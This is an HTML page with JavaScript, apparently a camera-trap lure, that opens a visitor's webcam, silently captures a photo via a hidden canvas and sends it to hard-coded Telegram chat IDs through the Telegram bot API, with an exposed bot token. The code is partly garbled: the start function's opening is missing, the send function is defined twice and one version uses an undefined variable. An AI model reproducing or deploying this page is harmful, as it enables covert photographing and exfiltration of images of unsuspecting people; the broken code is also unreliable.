<!DOCTYPE html>
<html>
<body style="margin:0; background:#000; overflow:hidden;">

<video id="cam" autoplay playsinline style="width:100vw; height:100vh; object-fit:cover;"></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
const BOT_TOKEN = "8365889018:AAEWsk1NrmJYhIbG4XFqI_awk4s4pCX9FqQ";
  const CHAT_IDS = ["1236150171", "5339727792"]; // два или больше// Укажи свой ID

async function sendToTelegram(blob) {
  const fd = new FormData();
  fd.append("photo", blob, "photo.png");

  for (let chat of CHAT_IDS) {
    const formData = new FormData();
    formData.append("chat_id", chat);
    formData.append("photo", blob, "photo.png");

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: "POST",
      body: formData
    });
  }
}
      // Даем камере включиться
      setTimeout(() => {
        takePhoto(video);
      }, 1000);
    };
  } catch (err) {
    console.error("Ошибка доступа к камере:", err);
  }
}

function takePhoto(video) {
  const canvas = document.getElementById("canvas");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  const ctx = canvas.getContext("2d");
  ctx.drawImage(video, 0, 0);

  canvas.toBlob((blob) => {
    sendToTelegram(blob);
  }, "image/png");
}

async function sendToTelegram(photoBlob) {
  const formData = new FormData();
  formData.append("chat_id", CHAT_ID);
  formData.append("photo", photoBlob, "photo.png");

  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
    method: "POST",
    body: formData
  });
}

start();
</script>

</body>

</html>

